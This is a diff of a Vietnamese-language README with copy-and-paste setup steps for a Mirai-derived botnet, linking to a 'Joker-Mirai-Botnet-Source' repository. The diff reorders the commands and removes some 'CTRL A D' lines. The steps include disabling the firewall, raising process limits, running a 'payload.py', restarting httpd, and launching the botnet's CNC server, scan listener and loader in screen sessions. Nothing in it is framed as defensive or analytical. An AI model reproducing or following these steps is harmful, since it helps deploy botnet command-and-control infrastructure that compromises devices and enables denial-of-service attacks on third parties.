@@ -185,16 +185,7 @@ CREATE TABLE `logins` (
 ) ENGINE=InnoDB DEFAULT CHARSET=latin1;
 exit;
 ```
-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
-Sao chép & Dán này: 
-```
-cd ~/; chmod 0777 * -R; sh build.sh
-```
-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-Sao chép & Dán này: 
-```
-python payload.py; service httpd restart 
-```
+
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 ```
 yum install firewalld;service firewalld stop
@@ -218,23 +209,30 @@ Sao chép & Dán
 ```
 ulimit -n999999; ulimit -u999999; ulimit -e999999
 ```
+
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+Sao chép & Dán này: 
+```
+cd ~/; chmod 0777 * -R; sh build.sh
+```
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+```
+python payload.py; service httpd restart 
+```
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 ```
 cd ~/
 screen -S cnc ./cnc
 ```
-CTRL A D
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 ```
 cd loader/
 screen -S rep ./scanListen 
 ```
-CTRL A D
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 ```
 screen -S loader
 ./run.sh
 ```
-CTRL A D
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 [Nguồn](https://github.com/USBBios/Joker-Mirai-Botnet-Source-V1)
